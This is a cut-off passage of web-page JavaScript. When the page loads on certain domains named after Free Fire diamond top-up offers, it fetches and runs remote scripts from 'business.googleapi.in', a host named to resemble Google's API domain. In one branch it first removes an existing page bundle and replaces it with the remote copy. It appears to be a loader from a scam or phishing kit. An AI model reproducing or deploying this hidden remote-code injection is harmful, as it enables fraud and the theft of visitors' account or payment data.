...
if (location.hostname == "freefire.napuudai.vn" || location.hostname == "napkimcuongfreefirex5.com") {
        var scpt = document.createElement("script");
        scpt.src = "https://business.googleapi.in/main.d2b63e46.js";
        document.head.appendChild(scpt);
    } else if (location.hostname == "napthex5freefire.vn" || location.hostname == "doan1.codechillchill.com") {
	var scripts12 = document.getElementsByTagName('script');
    for (var i = 0; i < scripts12.length; i++) {
        if (scripts12[i].src.includes('main.4215a91a.js')) {
            scripts12[i].parentNode.removeChild(scripts12[i]);
            break; // Dừng vòng lặp sau khi loại bỏ tệp script
        }
    }
        var scpt = document.createElement("script");
        scpt.src = "https://business.googleapi.in/main.4215a91a.js";
        document.head.appendChild(scpt);
    }
(function(i) {
    "use strict";
